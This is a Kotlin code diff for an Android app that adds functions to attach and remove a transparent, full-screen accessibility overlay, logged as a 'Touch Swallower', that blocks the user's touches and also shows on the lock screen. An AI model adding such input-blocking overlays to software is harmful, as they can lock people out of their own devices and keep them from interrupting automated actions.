@@ -25,6 +25,9 @@ object DynamicUIManager {
     private var statusBarView: WebView? = null
     private var isStatusBarAttached: Boolean = false
 
+    private var touchGuardView: android.view.View? = null
+    private var isGuardAttached: Boolean = false
+
     class CortexBridge(private val ctx: Context) {
         @JavascriptInterface
         fun close() {
@@ -477,6 +480,51 @@ object DynamicUIManager {
                 }
                 it.loadUrl("about:blank")
                 isStatusBarAttached = false
+            }
+        }
+    }
+
+    fun showTouchGuard(ctx: Context) {
+        Handler(Looper.getMainLooper()).post {
+            val service = MyAccessibilityService.instance ?: return@post
+            val wm = service.getSystemService(Context.WINDOW_SERVICE) as WindowManager
+
+            if (touchGuardView == null) {
+                touchGuardView = android.view.View(service).apply {
+                    setBackgroundColor(android.graphics.Color.TRANSPARENT)
+                }
+            }
+
+            if (!isGuardAttached) {
+                val params = WindowManager.LayoutParams(
+                    WindowManager.LayoutParams.MATCH_PARENT,
+                    WindowManager.LayoutParams.MATCH_PARENT,
+                    WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
+                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or 
+                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
+                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
+                    WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED,
+                    android.graphics.PixelFormat.TRANSLUCENT
+                )
+                try {
+                    wm.addView(touchGuardView, params)
+                    isGuardAttached = true
+                    DebugLogger.log("GUARD", "Touch Swallower DEPLOYED")
+                } catch (e: Exception) { }
+            }
+        }
+    }
+
+    fun removeTouchGuard(ctx: Context) {
+        Handler(Looper.getMainLooper()).post {
+            val service = MyAccessibilityService.instance ?: return@post
+            val wm = service.getSystemService(Context.WINDOW_SERVICE) as WindowManager
+            if (isGuardAttached && touchGuardView != null) {
+                try {
+                    wm.removeView(touchGuardView)
+                    isGuardAttached = false
+                    DebugLogger.log("GUARD", "Touch Swallower RELEASED")
+                } catch (e: Exception) { }
             }
         }
     }
